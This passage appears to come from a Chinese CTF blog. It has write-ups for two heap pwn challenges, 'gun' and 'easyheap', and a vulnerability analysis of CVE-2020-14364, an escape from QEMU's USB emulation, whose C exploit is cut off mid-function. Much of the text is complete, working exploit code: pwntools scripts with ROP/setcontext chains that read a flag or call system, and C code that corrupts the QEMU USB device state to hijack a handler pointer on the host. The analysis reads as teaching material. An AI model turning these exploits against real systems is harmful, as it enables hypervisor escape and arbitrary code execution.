    <content type="text"><![CDATA[gun 保护全开，且沙箱限制了只能使用open,read,write,exit4个函数 总共有3个功能，买子弹，上膛，发射，购买时可以给子弹命名，发射时会输出 子弹名字 123451.Shoot2.Load 3.Buy 4.Exit Action&gt; 每发子弹都有一个标志位，放在全局数组0x4070中 1231 - 已购买，未上膛2 - 已上膛0 - 已发射 buy123456789101112131415161718192021222324252627int __usercall buy@&lt;eax&gt;(__int64 a1@&lt;rbp&gt;)&#123; signed __int64 v2; // [rsp-18h] [rbp-18h] __int64 v3; // [rsp-18h] [rbp-18h] unsigned __int64 size; // [rsp-10h] [rbp-10h] __int64 v5; // [rsp-8h] [rbp-8h] __asm &#123; endbr64 &#125; v5 = a1; v2 = sub_1542(); // 从0下标开始，可能申请14个chunk if ( v2 &lt; 0 ) return puts("Enough"); if ( chunk_is_used[3 * v2] == 1LL ) return puts("The bullet is Used!"); printf("Bullet price: ", v2); size = read_int((__int64)&amp;v5); if ( size &lt;= 0xF || (signed __int64)((signed __int64)off_4010 - size) &lt; 0 ) return puts("Too pool!"); if ( size &gt; 0x500 ) return puts("Too big!"); *((_QWORD *)&amp;chunk + 3 * v3) = malloc(size); chunk_is_used[3 * v3] = 1LL; printf("Bullet Name: "); read_str((__int64)&amp;v5, *((_QWORD *)&amp;chunk + 3 * v3), size);// 这里没有0截断 off_4010 = (__int64 (__fastcall *)())((char *)off_4010 - size); return puts("Confirm");&#125; read_str函数没有0截断，所以可以用来泄漏地址 load1234567891011121314151617int __usercall load@&lt;eax&gt;(__int64 a1@&lt;rbp&gt;)&#123; unsigned __int64 idx; // [rsp-10h] [rbp-10h] __int64 v3; // [rsp-8h] [rbp-8h] __asm &#123; endbr64 &#125; v3 = a1; printf("Which one do you want to load?"); idx = read_int((__int64)&amp;v3); if ( idx &gt; 0xD || chunk_is_used[3 * idx] == 0LL || chunk_is_used[3 * idx] == 2LL ) return puts("what??"); if ( qword_4050 ) *((_QWORD *)&amp;unk_4068 + 3 * idx) = qword_4050; qword_4050 = (__int64)&amp;chunk + 0x18 * idx; *((_QWORD *)&amp;chunk + 3 * idx + 2) = 2LL; return puts("Confirm.");&#125; 子弹上膛函数，FILO，这个弹夹是一个栈结构，0x4050放着的是最后上膛的子弹 漏洞函数 shoot12345678910111213141516171819202122232425int __usercall shoot@&lt;eax&gt;(__int64 a1@&lt;rbp&gt;)&#123; __int64 v2; // rax __int128 v3; // [rsp-18h] [rbp-18h] __int64 v4; // [rsp-8h] [rbp-8h] __asm &#123; endbr64 &#125; v4 = a1; if ( !qword_4050 ) return puts("No bullet!"); printf("Shoot time: "); *(_QWORD *)((char *)&amp;v3 + 4) = (unsigned int)read_int((__int64)&amp;v4); LODWORD(v3) = 0; while ( qword_4050 &amp;&amp; (signed int)v3 &lt; SDWORD1(v3) ) &#123; printf("Pwn! The %s bullet fired.\n", *(_QWORD *)qword_4050, (_QWORD)v3); free(*(void **)qword_4050); // 指针未清空 *((_QWORD *)&amp;v3 + 1) = qword_4050; qword_4050 = *(_QWORD *)(qword_4050 + 8); *(_QWORD *)(*((_QWORD *)&amp;v3 + 1) + 0x10LL) = 0LL; LODWORD(v3) = v3 + 1; &#125; v2 = sub_159A(); return printf("%lld bullets left\n", v2, (_QWORD)v3);&#125; 存在UAF。值得注意的是，不仅是heap指针未清空，子弹前后关系的链表也没有清空 所以需要利用这个UAF造出个double free来 先购买并发射3发子弹，上膛顺序为2,1,0，发射后再购买1发子弹并上膛，之后再发射3发子弹，即可实现doubler free 像这样的构造方式就可以double free了，但是在glibc2.31的tcache中像 A-&gt;B-&gt;A还是会触发double free报错的，所以需要将这个double free构造在fastbin中去 这里注意对于fastbin double free的构造需要使用两个没有在tcache链表中的chunk来实现，如： 12tcache[0x40]:1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;6-&gt;7fastbin[0x40]:8-&gt;9-&gt;8 因为虽然 tcache满足了，但是如果再一次free(1)的话还是会进入tcache分支进行检测，这个时候就会触发double free了 构造如下图 orwdouble free实现后就可以写free_hook了，但是从glibc2.29后，setcontext函数的参数不再是rdi而是rdx，所以这里需要先找到一个gadget将参数转移到rdx *mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];* 接下来使用setcontext控制参数构造rop调用orw读取flag。 对于setcontext及orw heap更多的了解可以参考 https://n0va-scy.github.io/2020/03/14/setcontext/ https://n0va-scy.github.io/2020/03/14/UNCTF-orwheap/ exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176#coding:utf-8from pwn import *import syslocal = 1context.terminal=['tmux','splitw','-h']if len(sys.argv) == 2 and (sys.argv[1] == 'DEBUG' or sys.argv[1] == 'debug'): context.log_level = 'debug'if local: p = process('./gun') elf = ELF('./gun') #libc = elf.libc libc = ELF('libc-2.31.so')else: #p = remote("123.57.209.176","30772") p = remote("123.56.96.75","30772") elf = ELF('./gun') #libc = elf.libc libc = ELF('libc-2.31.so')#内存地址随机化def debug(addr=0,PIE=True): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) print "breakpoint_addr --&gt; " + hex(text_base + 0x4060) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) sd = lambda s:p.send(s)rc = lambda s:p.recv(s)sl = lambda s:p.sendline(s)ru = lambda s:p.recvuntil(s)sda = lambda a,s:p.sendafter(a,s)sla = lambda a,s:p.sendlineafter(a,s)def show(name,addr): log.info(name + " --&gt; %s",hex(addr))def name(): sla("name: ","rabbit")def choice(idx): sla("Action&gt; ",str(idx))def buy(size,data): choice(3) sla("price: ",str(size)) sda("Name: ",data)def load(idx): choice(2) sla("load?",str(idx))def shoot(idx): choice(1) sla("time: ",str(idx))name()buy(0x500,'a' + '\n')buy(0x10,'b' + '\n')load(0)#debug(0x167b)shoot(1)#debug(0x1947)buy(0x10,'b' + '\n')load(0)#debug(0x1669)shoot(1)ru("The ")libc_base = u64(rc(6).ljust(8,'\x00')) - 0x1ec062free_hook = libc_base + libc.symbols['__free_hook']setcontext = libc_base + libc.symbols['setcontext']show("libc_base: ",libc_base)#shoot(1)load(1)shoot(1)# double freefor i in range(10): buy(0x30,'a\n')load(1)load(2)load(0)for i in range(3,10): load(i)#debug(0x167b)shoot(10)buy(0x10,'b\n')load(0)shoot(3)ru("Pwn! The ")heap = u64(rc(6).ljust(8,'\x00'))show("heap: ",heap)print "double free done!"for i in range(7): buy(0x30,'a\n')buy(0x30,p64(free_hook) + '\n')buy(0x30,'b\n')buy(0x30,'c\n')if local: buy(0x30,p64(0x1547a0 + libc_base) + '\n') #localelse: buy(0x30,p64(0x154930 + libc_base) + '\n') #remotepop_rax = 0x000000000004a550 + libc_basepop_rdi = 0x0000000000026b72 + libc_basepop_rsi = 0x0000000000027529 + libc_baseif local: pop_rdx_r12 = 0x000000000011c1e1 + libc_base #localelse: pop_rdx_r12 = 0x000000000011c371 #remotesyscall_ret = 0x0000000000066229 + libc_baseret = 0x0000000000025679 + libc_basepay = ''if local: pay += p64(0x1547a0 + libc_base) #localelse: pay += p64(0x154930 + libc_base) #remotepay += p64(heap + 0x30e)pay = pay.ljust(0x20,'\x00')pay += p64(setcontext+33)pay = pay.ljust(0x38,'\x00')pay += p64(0)*2 #r8,r9pay = pay.ljust(0x68,'\x00')pay += p64(0) + p64(0) #rdi,rsipay = pay.ljust(0x88,'\x00')pay += p64(0) #rdxay = pay.ljust(0x98,'\x00')pay += p64(0) #rcxpay = pay.ljust(0xa0,'\x00') #return pay += p64(heap + 0x32e + 0xd0) #stackpay += p64(ret)pay = pay.ljust(0xe0,'\x00')pay += p64(heap + 0x32e)pay += p64(ret) #ret#open("flag")#flag = free_hook + 0x1b8flag = heap + 0x4c6pay += p64(pop_rdi) + p64(flag)#0xb0 here is rop#pay += p64(pop_rsi) + p64(0)#pay += p64(pop_rdx_r12) + p64(0) + p64(0)pay += p64(pop_rax) + p64(2)pay += p64(syscall_ret)#read(3,buf,0x200)pay += p64(pop_rdi) + p64(3)pay += p64(pop_rsi) + p64(heap &amp; 0xfffffffffffff000) #bufpay += p64(pop_rdx_r12) + p64(0x200) + p64(0)pay += p64(pop_rax) + p64(0)pay += p64(syscall_ret)#write(1,buf,0x200)pay += p64(pop_rdi) + p64(1)pay += p64(pop_rsi) + p64(heap &amp; 0xfffffffffffff000)pay += p64(pop_rdx_r12) + p64(0x200) + p64(0)pay += p64(pop_rax) + p64(1)pay += p64(syscall_ret)pay += "./flag\x00"#print hex(len(pay))buy(0x200,pay + '\n')load(11)#debug(0x167b)shoot(1)p.interactive() easyheap程序的漏洞在add函数中 先输入一个非法size，这时会赋值给v2，然后再输入合法size时，并没有更新v2，因此存在一个任意地址写入一个0字节的漏洞；接下来就是堆风水的构造 1、利用任意地址写0将topchunk size改小 2、利用任意地址写0修改tcache fd指向fastbin附近 实现overlop 3、申请一个特定大小的堆块，触发malloc_consolidate，并且切割之后放入unsorted bin中，这样泄漏出libc，并且获得另一块500的堆块，为double free准备 4、利用任意地址写0字节修改tcache fd 5、double free exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119#coding:utf-8from pwn import *import syslocal = 1# context.terminal=['tmux','splitw','-h']if len(sys.argv) == 2 and (sys.argv[1] == 'DEBUG' or sys.argv[1] == 'debug'): context.log_level = 'debug'if local: p = process('./easyheap') elf = ELF('./easyheap') libc = elf.libcelse: p = remote("")#内存地址随机化def debug(addr=0,PIE=True): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) print ("breakpoint_addr --&gt; " + hex(text_base + 0x202040)) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) sd = lambda s:p.send(s)rc = lambda s:p.recv(s)sl = lambda s:p.sendline(s)ru = lambda s:p.recvuntil(s)sda = lambda a,s:p.sendafter(a,s)sla = lambda a,s:p.sendlineafter(a,s)def choice(idx): sla("&gt;&gt; ",str(idx))def add(size,data = b"\n"): choice(1) sla("Size: ",str(size)) sda("Content: ",data)def overflow(size,new_size,data = b"\n"): choice(1) sla("Size: ",str(size)) sla("Size: ",str(new_size)) sda("Content: ",data)def show(idx): choice(2) sla("Index: ",str(idx))def delete(idx): choice(3) sla("Index: ",str(idx))add(0x80-0x40)delete(0)for i in range(7): add(0x58)add(0x58)for i in range(5): delete(i)delete(6)delete(7)add(0x58)# change top chunk sizeoverflow(0x60 + 0x58 +0x2, 0x58)add(0x58)delete(2)delete(1)delete(0)add(0x58)# change top chunk size# now top chunk size = 0x20overflow(0x60 + 0x58 +0x3, 0x58)add(0x58)delete(0)delete(1)delete(2)delete(5)# debug(0x154C)overflow(0x60+0x60+1, 0x58)add(0x58, b"a"*0x28 + p64(0x31) + b"\n") # 1add(0x58, b"\x00"*0x28 + p64(0x31) + b"\n") # 2# debug(0x14d7)add(0x28)show(2)ru("Content: ")main_arena = u64(ru(b"\n").strip(b"\n").ljust(8,b'\x00')) - 96malloc_hook = main_arena - 0x10libc_base = malloc_hook - libc.symbols['__malloc_hook']free_hook = libc_base + libc.symbols['__free_hook']system = libc_base + libc.symbols['system']log.info("main_arena --&gt; %s",hex(main_arena))log.info("free_hook --&gt; %s",hex(free_hook))add(0x28) #4delete(1)delete(0)delete(2)# debug(0x154C)# change tcache keysoverflow(0x98+2, 0x58, b"/bin/sh\x00\n") # 0# double freedelete(4)# debug()add(0x28, p64(free_hook) + b"\n")add(0x28)add(0x28, p64(system) + b"\n")delete(0)# debug()p.interactive()]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[cve-2020-14364 qemu逃逸漏洞分析]]></title>
    <url>%2F2020%2F10%2F23%2Fcve-2020-14364%20qemu%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[编译本文使用的是qemu-2.10.1，linux-4.10.10 编译qemu时关闭优化并开启调试信息，方便调试 12cd qemu-2.10.1/CFLAGS="-no-pie -fno-stack-protector -z execstack" ./configure --enable-debug --disable-strip 启动123456789101112~/qemu-2.10.1/x86_64-softmmu/qemu-system-x86_64 \-m 128M \-usb \-device usb-ehci,id=ehci \-device usb-tablet,bus=ehci.0 \-kernel ./bzImage \-initrd ./rootfs.img \-append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 kalsr uid=0" \-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \-nographic \-smp cores=2,threads=1 \-cpu kvm64,+smep 启动后在另一个窗口用attach pie调试进程 通过lspci命令，查看usb设备所在在总线号，这里是00:03.0 漏洞分析usb_process_one1234567891011121314151617181920212223242526272829303132333435static void usb_process_one(USBPacket *p)&#123; USBDevice *dev = p-&gt;ep-&gt;dev; /* * Handlers expect status to be initialized to USB_RET_SUCCESS, but it * can be USB_RET_NAK here from a previous usb_process_one() call, * or USB_RET_ASYNC from going through usb_queue_one(). */ p-&gt;status = USB_RET_SUCCESS; if (p-&gt;ep-&gt;nr == 0) &#123; /* control pipe */ if (p-&gt;parameter) &#123; do_parameter(dev, p); return; &#125; switch (p-&gt;pid) &#123; case USB_TOKEN_SETUP: do_token_setup(dev, p); break; case USB_TOKEN_IN: do_token_in(dev, p); break; case USB_TOKEN_OUT: do_token_out(dev, p); break; default: p-&gt;status = USB_RET_STALL; &#125; &#125; else &#123; /* data pipe */ usb_device_handle_data(dev, p); &#125;&#125; qemu\hw\core.c中的usb_process_one是对usb包进行处理的函数，参数是USBPacket结构，根据Packet中的pie进行设置(do_token_setup)、读(do_token_in)、写(do_token_out)三个操作中的一个 do_token_setup123456789101112131415161718192021222324252627282930313233343536373839404142434445464748static void do_token_setup(USBDevice *s, USBPacket *p)&#123; int request, value, index; if (p-&gt;iov.size != 8) &#123; p-&gt;status = USB_RET_STALL; return; &#125; usb_packet_copy(p, s-&gt;setup_buf, p-&gt;iov.size); s-&gt;setup_index = 0; p-&gt;actual_length = 0; s-&gt;setup_len = (s-&gt;setup_buf[7] &lt;&lt; 8) | s-&gt;setup_buf[6]; //---------&gt; [1] if (s-&gt;setup_len &gt; sizeof(s-&gt;data_buf)) &#123; //---------&gt; [2] fprintf(stderr, "usb_generic_handle_packet: ctrl buffer too small (%d &gt; %zu)\n", s-&gt;setup_len, sizeof(s-&gt;data_buf)); p-&gt;status = USB_RET_STALL; return; &#125; request = (s-&gt;setup_buf[0] &lt;&lt; 8) | s-&gt;setup_buf[1]; value = (s-&gt;setup_buf[3] &lt;&lt; 8) | s-&gt;setup_buf[2]; index = (s-&gt;setup_buf[5] &lt;&lt; 8) | s-&gt;setup_buf[4]; if (s-&gt;setup_buf[0] &amp; USB_DIR_IN) &#123; usb_device_handle_control(s, p, request, value, index, s-&gt;setup_len, s-&gt;data_buf); if (p-&gt;status == USB_RET_ASYNC) &#123; s-&gt;setup_state = SETUP_STATE_SETUP; &#125; if (p-&gt;status != USB_RET_SUCCESS) &#123; return; &#125; if (p-&gt;actual_length &lt; s-&gt;setup_len) &#123; s-&gt;setup_len = p-&gt;actual_length; &#125; s-&gt;setup_state = SETUP_STATE_DATA; &#125; else &#123; if (s-&gt;setup_len == 0) s-&gt;setup_state = SETUP_STATE_ACK; else s-&gt;setup_state = SETUP_STATE_DATA; &#125; p-&gt;actual_length = 8;&#125; qemu\hw\core.c中的do_token_setup函数； 【1】处s-&gt;setup_len由s-&gt;setup_buf[6]`s-&gt;setup_buf[7]`决定，所以len可控制 【2】处的判断，过大的s-&gt;setup_len会进行返回，但是s-&gt;setup_len已经被赋值，所以该处的检查没有起到效果。 do_token_in1234567891011121314151617181920212223242526272829303132333435363738394041424344static void do_token_in(USBDevice *s, USBPacket *p)&#123; int request, value, index; assert(p-&gt;ep-&gt;nr == 0); request = (s-&gt;setup_buf[0] &lt;&lt; 8) | s-&gt;setup_buf[1]; value = (s-&gt;setup_buf[3] &lt;&lt; 8) | s-&gt;setup_buf[2]; index = (s-&gt;setup_buf[5] &lt;&lt; 8) | s-&gt;setup_buf[4]; switch(s-&gt;setup_state) &#123; case SETUP_STATE_ACK: if (!(s-&gt;setup_buf[0] &amp; USB_DIR_IN)) &#123; usb_device_handle_control(s, p, request, value, index, s-&gt;setup_len, s-&gt;data_buf); if (p-&gt;status == USB_RET_ASYNC) &#123; return; &#125; s-&gt;setup_state = SETUP_STATE_IDLE; p-&gt;actual_length = 0; &#125; break; case SETUP_STATE_DATA: if (s-&gt;setup_buf[0] &amp; USB_DIR_IN) &#123; int len = s-&gt;setup_len - s-&gt;setup_index; //-----------&gt;[3] if (len &gt; p-&gt;iov.size) &#123; len = p-&gt;iov.size; &#125; usb_packet_copy(p, s-&gt;data_buf + s-&gt;setup_index, len);//---------[4] s-&gt;setup_index += len; if (s-&gt;setup_index &gt;= s-&gt;setup_len) &#123; s-&gt;setup_state = SETUP_STATE_ACK; &#125; return; &#125; s-&gt;setup_state = SETUP_STATE_IDLE; p-&gt;status = USB_RET_STALL; break; default: p-&gt;status = USB_RET_STALL; &#125;&#125; qemu\hw\core.c中的do_token_in函数； 【3】处使用s-&gt;setup_len获得len，而p-&gt;iov.size可由用户控制，例如设置p-&gt;iov.size为0x2000，则最后len为0x2000，所以会造成【4】处的复制操作造成越界访问 do_token_out1234567891011121314151617181920212223242526272829303132333435static void do_token_out(USBDevice *s, USBPacket *p)&#123; assert(p-&gt;ep-&gt;nr == 0); switch(s-&gt;setup_state) &#123; case SETUP_STATE_ACK: if (s-&gt;setup_buf[0] &amp; USB_DIR_IN) &#123; s-&gt;setup_state = SETUP_STATE_IDLE; /* transfer OK */ &#125; else &#123; /* ignore additional output */ &#125; break; case SETUP_STATE_DATA: if (!(s-&gt;setup_buf[0] &amp; USB_DIR_IN)) &#123; int len = s-&gt;setup_len - s-&gt;setup_index; if (len &gt; p-&gt;iov.size) &#123; //----------------[5] len = p-&gt;iov.size; &#125; usb_packet_copy(p, s-&gt;data_buf + s-&gt;setup_index, len); //------------[6] s-&gt;setup_index += len; if (s-&gt;setup_index &gt;= s-&gt;setup_len) &#123; s-&gt;setup_state = SETUP_STATE_ACK; &#125; return; &#125; s-&gt;setup_state = SETUP_STATE_IDLE; p-&gt;status = USB_RET_STALL; break; default: p-&gt;status = USB_RET_STALL; &#125;&#125; qemu\hw\core.c中的do_token_out函数； 同do_token_out函数，【5】处可控制 len，【6】处造成越界写 USBDevice123456789101112131415161718192021222324252627282930313233343536373839struct USBDevice &#123; DeviceState qdev; USBPort *port; char *port_path; char *serial; void *opaque; uint32_t flags; /* Actual connected speed */ int speed; /* Supported speeds, not in info because it may be variable (hostdevs) */ int speedmask; uint8_t addr; char product_desc[32]; int auto_attach; bool attached; int32_t state; uint8_t setup_buf[8]; uint8_t data_buf[4096]; &lt;------------- int32_t remote_wakeup; int32_t setup_state; int32_t setup_len; int32_t setup_index; USBEndpoint ep_ctl; USBEndpoint ep_in[USB_MAX_ENDPOINTS]; USBEndpoint ep_out[USB_MAX_ENDPOINTS]; QLIST_HEAD(, USBDescString) strings; const USBDesc *usb_desc; /* Overrides class usb_desc if not NULL */ const USBDescDevice *device; int configuration; int ninterfaces; int altsetting[USB_MAX_INTERFACES]; const USBDescConfig *config; const USBDescIface *ifaces[USB_MAX_INTERFACES];&#125;; EHCIState1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768struct EHCIState &#123; USBBus bus; DeviceState *device; qemu_irq irq; MemoryRegion mem; AddressSpace *as; MemoryRegion mem_caps; MemoryRegion mem_opreg; MemoryRegion mem_ports; int companion_count; bool companion_enable; uint16_t capsbase; uint16_t opregbase; uint16_t portscbase; uint16_t portnr; /* properties */ uint32_t maxframes; /* * EHCI spec version 1.0 Section 2.3 * Host Controller Operational Registers */ uint8_t caps[CAPA_SIZE]; union &#123; uint32_t opreg[0x44/sizeof(uint32_t)]; struct &#123; uint32_t usbcmd; uint32_t usbsts; uint32_t usbintr; uint32_t frindex; uint32_t ctrldssegment; uint32_t periodiclistbase; uint32_t asynclistaddr; uint32_t notused[9]; uint32_t configflag; &#125;; &#125;; uint32_t portsc[NB_PORTS]; /* * Internal states, shadow registers, etc */ QEMUTimer *frame_timer; QEMUBH *async_bh; bool working; uint32_t astate; /* Current state in asynchronous schedule */ uint32_t pstate; /* Current state in periodic schedule */ USBPort ports[NB_PORTS]; USBPort *companion_ports[NB_PORTS]; uint32_t usbsts_pending; uint32_t usbsts_frindex; EHCIQueueHead aqueues; EHCIQueueHead pqueues; /* which address to look at next */ uint32_t a_fetch_addr; uint32_t p_fetch_addr; USBPacket ipacket; QEMUSGList isgl; uint64_t last_run_ns; uint32_t async_stepdown; uint32_t periodic_sched_active; bool int_req_by_async; VMChangeStateEntry *vmstate;&#125;; 观察ehci_update_irq，(qemu\hw\usb\hcd-ehci.c)可以发现它调用了EHCIState-&gt;irq结构体中的函数指针，并且参数也在irq结构体中 123456789101112/* update irq line */static inline void ehci_update_irq(EHCIState *s)&#123; int level = 0; if ((s-&gt;usbsts &amp; USBINTR_MASK) &amp; s-&gt;usbintr) &#123; level = 1; &#125; trace_usb_ehci_irq(level, s-&gt;frindex, s-&gt;usbsts, s-&gt;usbintr); qemu_set_irq(s-&gt;irq, level);&#125; qemu_set_irq位置qemu\hw\core\irq.c 1234567void qemu_set_irq(qemu_irq irq, int level)&#123; if (!irq) return; irq-&gt;handler(irq-&gt;opaque, irq-&gt;n, level);&#125; 漏洞利用qemu虚拟地址转成物理地址参考链接：https://xz.aliyun.com/t/6562 首先通过mmio_mem = mmap(0,0x1000,PROT_READ | PROT_WRITE,MAP_SHARED,mmio_fd,0);映射到usb设备的内存。 接着对这块内存操作可以直接设置opreg的内容。 整体利用思路12345678910do_token_setup -&gt; 先发一个正常包设置 s-&gt;setup_state do_token_setup -&gt; 发一个size为0x5000的包设置 s-&gt;setup_lendo_token_out -&gt; 越界写，控制 s-&gt;setup_indexdo_token_out -&gt; 控制 s-&gt;setup_buf 使其能进入do_token_in进行读操作,同时设置 s-&gt;setup_index控制读的位置do_token_in -&gt; 读操作，泄漏text(text段)、irq(heap段)地址do_token_setup -&gt; 重新发送一个正常包恢复状态do_token_setup -&gt; 发一个size为0x5000的包设置 s-&gt;setup_lendo_token_out -&gt; 越界写，控制 s-&gt;setup_index,指向irq-&gt;handlerdo_token_out -&gt; 覆盖irq-&gt;handler为system@plt最后通过mmio读写触发ehci_update_irq-&gt;qemu_set_irq，最终执行system(&apos;xcalc&apos;)，完成利用 发包发送一个基本USBPacket的过程如下，需要构造的部分主要是红框中的部分 qtd-&gt;token包含了p-&gt;pid和p-&gt;iov.size，而p-&gt;pid决定了USBPacket 进入do_token_setup/in/out 123以图中为例2 &lt;&lt; 8 表示进入do_token_setup ,0进入do_token_out, 1进入do_token_in8 &lt;&lt; 16 表示 p-&gt;iov.size为8 step1仅需构造正常的packet ，在do_token_setup中设置s-&gt;setup_state = SETUP_STATE_DATA (2)，为后续做准备 step2继续进入do_token_setup，设置s-&gt;setup_len为0x5000,sizeof(s-&gt;data_buf)为0x1000，因此可以越界，且此时s-&gt;setup_state仍为2 step3由于step1中 s-&gt;setup_buf[0]被设置成了0，因此现在只能进入do_token_out进行写操作，结合USBDevice结构体，data_buf后方可劫持s-&gt;setup_index,并且setup_buf位置data_buf前方 1usb_packet_copy(p, s-&gt;data_buf + s-&gt;setup_index, len); usb_packet_copy的起始位置是data_buf + s-&gt;setup_index，因此只要将index改为负数 ，下次写入就可以控制 setup_buf，使得可以进入do_token_in进行越界读 step4控制 s-&gt;setup_buf 使其能进入do_token_in进行读操作,同时设置 s-&gt;setup_index控制读的位置 step5进入do_token_in 读操作，泄漏text(text段)、irq(heap段)地址 step6因为s-&gt;setup_buf[0]已经为0x80，无法进入do_token_out进入写操作，所以重新发送一个正常包恢复状态 step7发包进入do_token_setup 设置s-&gt;setup_len 为0x5000 step8进入do_token_out越界写控制 s-&gt;setup_index指向irq-&gt;handler为下一步准备 step9进入do_token_out覆盖irq-&gt;handler为system@plt，最后通过mmio读写触发ehci_update_irq-&gt;qemu_set_irq，最终执行system(‘xcalc’)，完成利用 exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388#include &lt;assert.h&gt;#include &lt;fcntl.h&gt;#include &lt;inttypes.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/io.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;errno.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/socket.h&gt;#include &lt;stdbool.h&gt;#include &lt;netinet/in.h&gt;unsigned char *mmio_mem;char *dmabuf;struct ohci_hcca *hcca;struct EHCIqtd *qtd;struct ohci_ed *ed;struct ohci_td *td;char *setup_buf;uint32_t *dmabuf32;char *td_addr;struct EHCIqh *qh;struct ohci_td *td_1;char *dmabuf_phys_addr;typedef struct USBDevice USBDevice;typedef struct USBEndpoint USBEndpoint;long long data_buf;long long irq;long long text;unsigned int *ptr;struct USBEndpoint&#123; uint8_t nr; uint8_t pid; uint8_t type; uint8_t ifnum; int max_packet_size; int max_streams; bool pipeline; bool halted; USBDevice *dev; USBEndpoint *fd; USBEndpoint *bk;&#125;;struct USBDevice&#123; int32_t remote_wakeup; int32_t setup_state; int32_t setup_len; int32_t setup_index; USBEndpoint ep_ctl; USBEndpoint ep_in[15]; USBEndpoint ep_out[15];&#125;;typedef struct EHCIqh&#123; uint32_t next; /* Standard next link pointer */ /* endpoint characteristics */ uint32_t epchar; /* endpoint capabilities */ uint32_t epcap; uint32_t current_qtd; /* Standard next link pointer */ uint32_t next_qtd; /* Standard next link pointer */ uint32_t altnext_qtd; uint32_t token; /* Same as QTD token */ uint32_t bufptr[5]; /* Standard buffer pointer */&#125; EHCIqh;typedef struct EHCIqtd&#123; uint32_t next; /* Standard next link pointer */ uint32_t altnext; /* Standard next link pointer */ uint32_t token; uint32_t bufptr[5]; /* Standard buffer pointer */&#125; EHCIqtd;void die(const char *msg)&#123; perror(msg); exit(-1);&#125;uint64_t virt2phys(void *p)&#123; uint64_t virt = (uint64_t)p; // Assert page alignment int fd = open("/proc/self/pagemap", O_RDONLY); if (fd == -1) die("open"); uint64_t offset = (virt / 0x1000) * 8; lseek(fd, offset, SEEK_SET); uint64_t phys; if (read(fd, &amp;phys, 8) != 8) die("read"); // Assert page present phys = (phys &amp; ((1ULL &lt;&lt; 54) - 1)) * 0x1000 + (virt &amp; 0xfff); return phys;&#125;void mmio_write(uint32_t addr, uint32_t value)&#123; *((uint32_t *)(mmio_mem + addr)) = value;&#125;uint64_t mmio_read(uint32_t addr)&#123; return *((uint64_t *)(mmio_mem + addr));&#125;void init()&#123; int mmio_fd = open("/sys/devices/pci0000:00/0000:00:03.0/resource0", O_RDWR | O_SYNC); if (mmio_fd == -1) die("mmio_fd open failed"); mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0); if (mmio_mem == MAP_FAILED) die("mmap mmio_mem failed"); dmabuf = mmap(0, 0x3000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0); if (dmabuf == MAP_FAILED) die("mmap"); mlock(dmabuf, 0x3000); dmabuf32 = dmabuf + 4; qtd = dmabuf + 0x200; qh = dmabuf + 0x100; setup_buf = dmabuf + 0x300; ptr = dmabuf;&#125;void init_state()&#123; mmio_write(0x64, 0x100); mmio_write(0x64, 0x4); qh-&gt;epchar = 0x00; qh-&gt;token = 1 &lt;&lt; 7; qh-&gt;current_qtd = virt2phys(dmabuf + 0x200); qtd = dmabuf + 0x200; qtd-&gt;token = 1 &lt;&lt; 7 | 2 &lt;&lt; 8 | 8 &lt;&lt; 16; qtd-&gt;bufptr[0] = virt2phys(dmabuf + 0x300); setup_buf[6] = 0xff; setup_buf[7] = 0x0; dmabuf32[0] = virt2phys(dmabuf + 0x100) + 0x2; mmio_write(0x28, 0x0); mmio_write(0x30, 0x0); mmio_write(0x2c,0); mmio_write(0x34, virt2phys(dmabuf)); mmio_write(0x20, 0x11);&#125;void set_length(uint16_t len, uint8_t in)&#123; mmio_write(0x64, 0x100); mmio_write(0x64, 0x4); setup_buf[0] = in; setup_buf[6] = len &amp; 0xff; setup_buf[7] = (len &gt;&gt; 8) &amp; 0xff; qh-&gt;epchar = 0x00; qh-&gt;token = 1 &lt;&lt; 7; qh-&gt;current_qtd = virt2phys(dmabuf + 0x200); qtd-&gt;token = 1 